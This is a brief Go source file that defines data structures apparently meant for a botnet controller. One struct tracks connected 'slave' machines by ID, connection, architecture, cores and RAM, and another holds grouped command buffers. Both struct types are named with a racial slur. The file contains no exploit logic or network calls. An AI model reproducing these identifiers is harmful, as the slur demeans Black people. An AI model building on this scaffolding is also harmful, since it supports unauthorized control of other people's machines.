package slave_v2

import "net"

type Nigger struct {
	ID int
	net.Conn

	Source  string
	Version string
	Arch    string
	Cores   string
	RAM     string
}

type NiggerCommand struct {
	Buffer []byte
	Count  int
	Group  string
}
